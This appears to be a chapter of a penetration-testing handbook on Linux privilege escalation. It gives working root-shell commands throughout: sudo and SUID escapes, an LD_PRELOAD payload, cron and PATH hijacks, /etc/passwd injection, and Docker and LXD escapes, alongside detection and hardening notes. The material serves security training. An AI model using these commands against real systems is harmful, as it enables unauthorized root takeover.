---
title: "02_Linux_Privilege_Escalation_Techniques"
---

# Linux Privilege Escalation Techniques

> **Privilege Escalation Handbook** — File 02  
> Focus: exploitation paths after enumeration (see File 01)  
> Assumes authorized testing only

---

## Table of Contents

1. [Overview & Decision Framework](#1-overview--decision-framework)
2. [Kernel Exploits](#2-kernel-exploits)
3. [Sudo Misconfigurations & GTFOBins](#3-sudo-misconfigurations--gtfobins)
4. [SUID / SGID Abuse](#4-suid--sgid-abuse)
5. [Linux Capabilities](#5-linux-capabilities)
6. [Cron Jobs & Timers](#6-cron-jobs--timers)
7. [PATH Hijacking](#7-path-hijacking)
8. [LD_PRELOAD & Shared Library Attacks](#8-ld_preload--shared-library-attacks)
9. [NFS Misconfigurations](#9-nfs-misconfigurations)
10. [Docker Escape](#10-docker-escape)
11. [LXD / LXC Escape](#11-lxd--lxc-escape)
12. [Other High-Value Techniques](#12-other-high-value-techniques)
13. [Detection Notes for Blue Teams](#13-detection-notes-for-blue-teams)
14. [Scenario Walkthroughs](#14-scenario-walkthroughs)
15. [References](#15-references)

---

## 1. Overview & Decision Framework

### 1.1 Prefer Configuration Abuse Over Exploits

| Priority | Technique class | Reliability | Noise |
|----------|-----------------|-------------|-------|
| 1 | sudo / SUID / caps / groups | High | Low–Med |
| 2 | Cron / PATH / writable services | High | Low |
| 3 | Docker / LXD membership | High | Med |
| 4 | Credential reuse → root login | High | Low |
| 5 | Kernel / Polkit CVEs | Variable | High |

### 1.2 Pre-Exploit Checklist

```bash
id; sudo -l; uname -r
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
# Confirm writable attack surface before running public exploits
```

> **Warning:** Public kernel exploits can crash hosts. Always snapshot/lab-test first. Prefer stable misconfig paths in production assessments.

---

## 2. Kernel Exploits

### 2.1 When to Consider Kernel LPE

- No sudo/SUID/cron path
- Kernel is known-vulnerable and exploit is stable for that exact version
- Engagement allows potential instability

### 2.2 Version Mapping

```bash
uname -r
cat /proc/version
# On attacker machine, map CVEs carefully — do not run random PoCs
```

Common historical families (examples for study — verify current applicability):

| Area | Example issues | Notes |
|------|----------------|-------|
| Dirty Pipe | CVE-2022-0847 | Kernel 5.8–5.16.x range historically |
| Dirty COW | CVE-2016-5195 | Older kernels |
| PwnKit | CVE-2021-4034 | polkit pkexec (userland) |
| netfilter/nft | Various | Often needs userns |

### 2.3 Safe Workflow

1. Confirm exact kernel and distro patches (`uname -a`, package changelog).
2. Search trusted sources (distro security trackers, not random blogs only).
3. Compile on attacker box matching architecture.
4. Transfer binary; run with monitoring; have rollback plan.
5. Document CVE, reliability, and business risk.

### 2.4 User Namespaces & Hardening Checks

```bash
cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null
sysctl kernel.unprivileged_userns_clone 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict
cat /proc/sys/kernel/kptr_restrict
```

> **Pro tip:** Many modern exploits need unprivileged user namespaces. If disabled, skip those PoCs early.

### 2.5 Detection Notes

- Sudden compilation toolchains on servers
- New SUID binaries appearing in `/tmp`
- Kernel oops / panic events in `dmesg` / journal

---

## 3. Sudo Misconfigurations & GTFOBins

### 3.1 Enumerate Sudo Rights

```bash
sudo -l
sudo -l -U $(whoami)
```

Example output patterns:

```text
(ALL) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/find
(ALL : ALL) ALL
User may run the following commands on host:
    (root) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py
```

### 3.2 GTFOBins Methodology

1. Identify allowed binary/script.
2. Open [GTFOBins](https://gtfobins.github.io/) entry.
3. Prefer **sudo** or **SUID** section matching your case.
4. Spawn interactive root shell when possible.

### 3.3 High-Frequency GTFOBins Examples

**vim**

```bash
sudo vim -c ':!/bin/sh'
# or
sudo vim
# then :!bash
```

**find**

```bash
sudo find . -exec /bin/sh \; -quit
```

**less / more / man**

```bash
sudo less /etc/profile
# then type !bash
```

**python / python3**

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

**perl**

```bash
sudo perl -e 'exec "/bin/sh";'
```

**bash**

```bash
sudo bash
```

**awk**

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**nmap** (older with interactive mode)

```bash
# TF=$(mktemp); echo 'os.execute("/bin/sh")' > $TF
# sudo nmap --script=$TF
# Or older: sudo nmap --interactive then !sh
```

**env**

```bash
sudo env /bin/sh
```

**ftp / mysql / gdb** — check GTFOBins for current one-liners.

### 3.4 Dangerous Sudo Patterns

| Pattern | Risk |
|---------|------|
| `ALL` as root | Full compromise |
| Wildcard paths `*` | Argument injection / path abuse |
| Editors (vim, nano, less) | Shell escape |
| Package managers (apt, yum) | Install root backdoors / hooks |
| `SETENV` / `env_keep` with LD_* | Library injection |
| Relative paths in sudoers | PATH hijack under sudo |

### 3.5 Sudo Token & Timestamp Abuse

```bash
# If user recently used sudo and you share session/TTY tricks (rare/local)
ls -la /var/lib/sudo/ts/ 2>/dev/null
```

### 3.6 sudoedit / CVE Patterns

Always check sudo version for known issues when other paths fail:

```bash
sudo --version
```

Study historical issues (e.g., CVE-2021-3156 Baron Samedit) only against confirmed vulnerable versions.

### 3.7 Real-World Scenario

**Scenario:** Developer granted `NOPASSWD: /usr/bin/systemctl restart myapp.service` only.

- Check if unit file or `ExecStart` binary is writable.
- If not, check whether `systemctl` status/edit paths leak more rights.
- Sometimes `systemctl` is broader than intended (edit unit as root depending on policy).

---

## 4. SUID / SGID Abuse

### 4.1 Find Candidates

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

### 4.2 Standard vs Unusual

Distro defaults (`passwd`, `sudo`, `ping`, `mount`) are expected. Focus on:

- Custom apps in `/usr/local`, `/opt`
- Interpreters with SUID (dangerous)
- `find`, `vim`, `bash`, `cp`, `mv` with SUID (misconfig)

### 4.3 GTFOBins SUID Pattern

Example: SUID `python3`

```bash
# Only works if binary is SUID root and not dropping privs properly
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Example: SUID `bash` (rare)

```bash
bash -p
```

### 4.4 Shared Object Injection (SUID)

```bash
ldd /path/to/suid_binary
readelf -d /path/to/suid_binary | grep NEEDED
strace /path/to/suid_binary 2>&1 | grep -iE 'open|access|no such'
```

If binary loads library from writable path, plant malicious `.so`.

### 4.5 Command Injection in SUID Wrappers

Custom SUID scripts (especially shell scripts — kernel may ignore SUID on scripts, but wrappers exist) often pass user input to system calls.

```bash
# Test carefully for injection
./backup -f '; id'
./backup --path /tmp/$(id)
```

### 4.6 Detection Notes

- Unexpected SUID bits on non-standard paths
- New SUID files in world-writable dirs

---

## 5. Linux Capabilities

### 5.1 List Capabilities

```bash
getcap -r / 2>/dev/null
```

### 5.2 Dangerous Capabilities

| Capability | Abuse potential |
|------------|-----------------|
| `cap_setuid` / `cap_setgid` | Become root |
| `cap_dac_read_search` | Read any file |
| `cap_dac_override` | Bypass file read/write checks |
| `cap_sys_admin` | Broad; near-root in many contexts |
| `cap_sys_ptrace` | Inject into privileged processes |
| `cap_sys_module` | Load kernel modules |
| `cap_net_raw` / `cap_net_admin` | Sniffing / network manipulation |
| `cap_chown` | Change file ownership |

### 5.3 Example: python3 with cap_setuid

```bash
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid+ep
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

### 5.4 Example: tar / perl with capabilities

Check GTFOBins **Capabilities** sections for binary-specific recipes.

### 5.5 Detection Notes

- Non-default `getcap` results on interpreters
- Changes to file capabilities (`setcap` usage)

---

## 6. Cron Jobs & Timers

### 6.1 Identify Root Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/
systemctl list-timers --all
```

### 6.2 Writable Script Executed by Root

```bash
# If /usr/local/bin/cleanup.sh is writable and run by root cron:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /usr/local/bin/cleanup.sh
# Wait for execution
/tmp/rootbash -p
```

Safer assessment style: write a proof file instead of permanent SUID:

```bash
echo 'id > /tmp/pwned_cron' >> /usr/local/bin/cleanup.sh
```

### 6.3 Wildcard Injection in Cron

If cron runs:

```bash
tar -czf /tmp/backup.tar.gz *
```

in a writable directory, classic tar checkpoint exploitation may apply (environment-dependent). Research current tar exploitation carefully; prefer simpler writable-script paths.

### 6.4 systemd Timer Abuse

If a timer unit or service `ExecStart=` points to a writable binary:

```bash
# Replace binary carefully (authorized tests)
cp /bin/bash /opt/app/bin/worker   # example only — destructive; better use controlled payload
```

Prefer:

```bash
# Backup original, drop proof payload, restore after
```

### 6.5 Detection Notes

- Modifications to cron directories
- Unexpected files created by root in `/tmp` on schedule

---

## 7. PATH Hijacking

### 7.1 Conditions

Root (or privileged user) runs a script that calls a command **without absolute path**, and you can write to a directory earlier in `$PATH`.

### 7.2 Discover

```bash
# From cron/script:
#   backup.sh contains:  tar cf ...   or  clean
echo $PATH
# Writable path dirs
find $(echo $PATH | tr ':' ' ') -type d -writable 2>/dev/null
```

### 7.3 Exploit

```bash
# Suppose root cron runs `cleanup` without full path and /home/user/bin is first in PATH for that job
cat > /home/user/bin/cleanup << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/bashroot
chmod 4755 /tmp/bashroot
EOF
chmod +x /home/user/bin/cleanup
```

### 7.4 Sudo PATH Issues

If sudoers allows relative command names or preserves insecure PATH, hijack may elevate via sudo.

### 7.5 Detection Notes

- Cron scripts using relative commands
- World-writable directories in root PATH (severe misconfig)

---

## 8. LD_PRELOAD & Shared Library Attacks

### 8.1 LD_PRELOAD with Sudo

If `sudo -l` shows `env_keep+=LD_PRELOAD` or `SETENV`:

```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /tmp/preload.so preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
```

### 8.2 RPATH / RUNPATH / ldconfig Abuse

```bash
# Writable directory in library search path used by privileged binary
ldd /usr/local/bin/privapp
# Plant libname.so.X with constructor that spawns shell
```

### 8.3 Detection Notes

- `LD_PRELOAD` in audit logs for sudo
- Unexpected shared objects in `/lib` or app dirs

---

## 9. NFS Misconfigurations

### 9.1 Identify Exports

From client or server:

```bash
cat /etc/exports
showmount -e <nfs-server>
mount | grep nfs
```

### 9.2 no_root_squash

If export has `no_root_squash`, root on the **client** is treated as root on the share.

**Attack outline (authorized lab):**

1. Mount the share on attacker-controlled Linux as root.
2. Create SUID bash on the share:

```bash
# On attacker (root)
mount -t nfs server:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```

3. On victim, execute `/path/on/share/bash -p` if accessible to low-priv user.

### 9.3 Other NFS Issues

- World-writable exports
- Weak auth / unrestricted clients (`*`)
- Squash misconfigs

### 9.4 Detection Notes

- Unexpected SUID files on NFS mounts
- Broad `/etc/exports` without squash

---

## 10. Docker Escape

### 10.1 docker Group Membership

Membership in `docker` is often **root-equivalent**.

```bash
id
docker images
docker ps -a
```

### 10.2 Mount Host Root via Privileged/Run

```bash
docker run -it -v /:/host --rm alpine chroot /host /bin/bash
# Or privileged:
docker run -it --privileged --rm -v /:/mnt alpine chroot /mnt sh
```

### 10.3 Docker Socket Mount

If `/var/run/docker.sock` is writable/accessible:

```bash
ls -la /var/run/docker.sock
# Use docker CLI or curl API to create privileged container mounting host FS
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

### 10.4 Privileged Container Escape (inside container)

```bash
# Check
cat /proc/self/status | grep Cap
fdisk -l
# Mount host disk if visible and privileged
mkdir /tmp/host
mount /dev/sda1 /tmp/host   # device names vary
chroot /tmp/host
```

### 10.5 Detection Notes

- Non-admin users in `docker` group
- Containers started with `--privileged` or docker.sock mounts
- Unexpected privileged containers

---

## 11. LXD / LXC Escape

### 11.1 Group Membership

```bash
id | grep lxd
lxc list
```

### 11.2 Classic Approach (outline)

1. Initialize LXD if needed (`lxd init` — may already be done).
2. Import an image (alpine).
3. Create container with **security.privileged=true** and mount host `/`.
4. Enter container and `chroot` to host rootfs.

```bash
# Simplified pattern — adjust for environment
lxc init images:alpine/3.18 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# inside: chroot /mnt/root /bin/bash
```

> Exact image import steps vary offline/online. Practice in a lab before exams/engagements.

### 11.3 Detection Notes

- Untrusted users in `lxd` group
- Privileged LXD containers with host mounts

---

## 12. Other High-Value Techniques

### 12.1 Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable:
openssl passwd -1 -salt xyz password123
# Append: root2:$1$xyz$...:0:0:root:/root:/bin/bash
su root2
```

### 12.2 Readable /etc/shadow → Crack → su/ssh

```bash
cat /etc/shadow
# Offline crack, then su or SSH
```

### 12.3 Weak File Permissions on Service Binaries

```bash
# systemctl cat myservice
# If ExecStart binary is group/world writable → replace with payload
```

### 12.4 Python Library Path Hijack

If root Python script imports from cwd or writable `PYTHONPATH`:

```bash
# Plant malicious module matching import name
```

### 12.5 tmux / screen Sessions as Root

```bash
tmux ls 2>/dev/null
screen -ls 2>/dev/null
# Attach if permissions allow (sometimes mis-set sockets)
```

### 12.6 Kernel Module Paths / Vulnerable Drivers

Less common in CTFs; more in specialized assessments.

### 12.7 Polkit Interactive Auth Bypass / Misconfig

Check polkit rules under `/etc/polkit-1/` and `/usr/share/polkit-1/`.

### 12.8 Password Hunting → Lateral → Root

```bash
grep -Rni pass /var/www /home /opt 2>/dev/null | head
# Reuse against root SSH if PermitRootLogin yes
```

---

## 13. Detection Notes for Blue Teams

| Technique | Signals |
|-----------|---------|
| sudo GTFOBins | sudo logs with editors/interpreters; unexpected shells as root |
| SUID abuse | Audit `execve` of unusual SUID binaries |
| Capabilities | Inventory baselines for `getcap` |
| Cron write | FIM on cron scripts; root processes spawning from `/tmp` |
| PATH hijack | Root executions of binaries from user homes |
| LD_PRELOAD | sudo env anomalies |
| Docker/LXD | Group membership reviews; privileged container creates |
| Kernel exploits | Crashes, known exploit hashes, compile tools on servers |

Harden:

- Least-privilege sudoers (no shells/editors)
- Remove unnecessary SUID/caps
- No human users in `docker`/`lxd` without strong justification
- `root_squash` on NFS
- Patch kernels and polkit promptly
- File integrity monitoring on cron and unit files

---

## 14. Scenario Walkthroughs

### Scenario A — Web App to Root via Cron

1. Reverse shell as `www-data`.
2. LinPEAS finds `/etc/cron.d/backup` running `/opt/backup.sh` as root.
3. `ls -la /opt/backup.sh` → writable by `www-data`.
4. Append proof payload; wait ≤5 minutes.
5. Obtain root shell; rotate backdoor; document.

### Scenario B — Developer sudo vim

1. User `dev` has `NOPASSWD: /usr/bin/vim`.
2. `sudo vim -c ':!/bin/sh'`.
3. Root shell; optional: fix sudoers recommendation for report.

### Scenario C — Docker Group

1. `id` shows `docker`.
2. `docker run -v /:/host -it alpine chroot /host sh`.
3. Full host root; recommend removing docker group rights.

### Scenario D — Capabilities on Python

1. `getcap -r /` shows `/usr/bin/python3.10 cap_setuid+ep`.
2. Python one-liner to `setuid(0)` and spawn shell.
3. Recommend removing capability.

---

## 15. References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [MITRE ATT&CK T1068](https://attack.mitre.org/techniques/T1068/) Privilege Escalation: Exploitation for Privilege Escalation
- [MITRE ATT&CK T1548.001](https://attack.mitre.org/techniques/T1548/001/) Setuid and Setgid
- [MITRE ATT&CK T1548.003](https://attack.mitre.org/techniques/T1548/003/) Sudo and Sudo Caching
- [Docker security](https://docs.docker.com/engine/security/)
- [Linux capabilities man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)

---

## Appendix: Technique Selection Flowchart (Text)

```text
Got shell as low-priv user
        |
        v
   sudo -l interesting? --yes--> GTFOBins / sudo exploit path
        | no
        v
   docker/lxd group or sock? --yes--> container escape
        | no
        v
   SUID/SGID/capabilities unusual? --yes--> GTFOBins / setuid caps
        | no
        v
   Writable root cron/timer/service binary? --yes--> plant payload
        | no
        v
   PATH/LD_PRELOAD/NFS misconfig? --yes--> hijack / no_root_squash
        | no
        v
   Creds for root/service? --yes--> su/ssh/reuse
        | no
        v
   Vulnerable kernel/polkit + allowed risk? --yes--> carefully tested exploit
        | no
        v
   Expand enumeration / lateral movement
```

---

*End of File 02 — Linux Privilege Escalation Techniques*  
*Related: File 01 (enum), File 07 (tools), File 08 (detection/evasion)*
